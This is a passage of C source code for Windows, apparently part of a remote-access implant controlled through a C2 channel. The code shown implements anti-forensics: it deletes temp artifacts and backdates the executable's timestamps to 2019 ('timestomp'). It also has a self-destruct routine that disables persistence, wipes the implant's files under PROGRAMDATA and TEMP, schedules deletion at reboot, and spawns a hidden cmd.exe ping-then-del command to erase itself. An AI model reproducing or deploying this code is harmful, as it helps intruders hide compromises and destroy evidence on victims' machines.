                } while (FindNextFileA(h, &fd));
                FindClose(h);
            }
            free(tmp);
        }
        if (!first) buf_append_str(out, ","); first = 0;
        buf_append_str(out, "\"temp_artifacts\"");
    }
    if (do_time) {
        char *self = exe_path();
        SYSTEMTIME st;
        FILETIME ft;
        HANDLE h;
        wchar_t *ws;
        memset(&st, 0, sizeof(st));
        st.wYear = 2019; st.wMonth = 3; st.wDay = 1; st.wHour = 9; st.wMinute = 15;
        SystemTimeToFileTime(&st, &ft);
        ws = widen(self);
        h = ws ? CreateFileW(ws, FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                             OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL) : INVALID_HANDLE_VALUE;
        if (h != INVALID_HANDLE_VALUE) {
            SetFileTime(h, &ft, &ft, &ft);
            CloseHandle(h);
        }
        if (ws) free(ws);
        free(self);
        if (!first) buf_append_str(out, ","); first = 0;
        buf_append_str(out, "\"timestomp\"");
    }
    buf_append_str(out, "]}");
    return 0;
}

static void spawn_self_wipe(const char *self)
{
    char cmd[1024];
    wchar_t *wcmd;
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    snprintf(cmd, sizeof(cmd), "cmd.exe /c ping -n 4 127.0.0.1 >nul & del /f /q \"%s\"", self);
    wcmd = widen(cmd);
    if (!wcmd) return;
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    memset(&pi, 0, sizeof(pi));
    if (CreateProcessW(NULL, wcmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
    free(wcmd);
}

int mod_selfdestruct(const json *args, buf_t *out)
{
    char name[128];
    char self[MAX_PATH * 2];
    char *pd, *tmp;
    (void)args;
    persist_name(name, sizeof(name));
    {
        buf_t dummy;
        buf_init(&dummy);
        mod_persist_disable(NULL, &dummy);
        buf_free(&dummy);
    }
    snprintf(self, sizeof(self), "%s", exe_path() ? exe_path() : "");
    if (self[0]) {
        wchar_t *ws = widen(self);
        if (ws) {
            /* MOVEFILE_DELAY_UNTIL_REBOOT == 0x4 ; schedule removal at next boot */
            MoveFileExW(ws, NULL, (DWORD)0x4);
            free(ws);
        }
    }
    pd = env_dup("PROGRAMDATA");
    if (pd) {
        char p[MAX_PATH * 2];
        snprintf(p, sizeof(p), "%s\\%s\\%s.exe", pd, name, name);
        wipe_file(p);
        snprintf(p, sizeof(p), "%s\\%s", pd, name);
        wipe_dir_tree(p);
        free(pd);
    }
    tmp = env_dup("TEMP");
    if (tmp) {
        char p[MAX_PATH * 2];
        snprintf(p, sizeof(p), "%s\\%s.exe", tmp, name);
        wipe_file(p);
        free(tmp);
    }
    if (self[0]) spawn_self_wipe(self);
    buf_append_str(out, "{");
    jbool(out, "ok", 1);
    buf_append_str(out, ","); jstr(out, "self", self);
    buf_append_str(out, ","); jbool(out, "exit_now", 1);
    buf_append_str(out, "}");
    c2_request_shutdown();
    return 0;
}
